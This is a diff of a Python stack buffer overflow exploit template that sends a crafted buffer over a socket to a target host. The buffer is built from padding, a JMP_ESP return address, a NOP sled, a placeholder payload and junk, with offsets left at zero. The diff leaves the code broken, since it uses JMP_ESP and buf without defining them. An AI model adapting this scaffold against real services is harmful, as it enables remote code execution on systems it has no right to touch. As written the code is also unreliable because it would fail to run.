@@ -4,25 +4,23 @@ import sys, socket
 from time import sleep
 import struct
 
-packer = lambda x : struct.pack('I', x)
-
-TARGET = '192.168.140.141'
+TARGET = 'ip_address'
 PORT = 1234
 PATH = '/'
 
 CRASH_LEN = 0
 OVERFLOW_LEN = 0
 
-# JMP_ESP = packer(0x??) 
 NOP_SLED = "\x90" * 32
 
+# Uncomment for each step
 # buffer = "A" * OVERFLOW_LEN + "B" * 4 + "C" * (CRASH_LEN - OVERFLOW_LEN - 4)
 # buffer = "A" * OVERFLOW_LEN + JMP_ESP + "C" * (CRASH_LEN - OVERFLOW_LEN - len(JMP_ESP))
 
-shellcode =  ""
+payload =  ""
 
 junk =  "C" * (CRASH_LEN - OVERFLOW_LEN - len(JMP_ESP) - len(buf) - len(NOP_SLED))
-exploit = "A" * OVERFLOW_LEN + JMP_ESP + NOP_SLED + shellcode + junk
+exploit = "A" * OVERFLOW_LEN + JMP_ESP + NOP_SLED + payload + junk
 
 
 try:
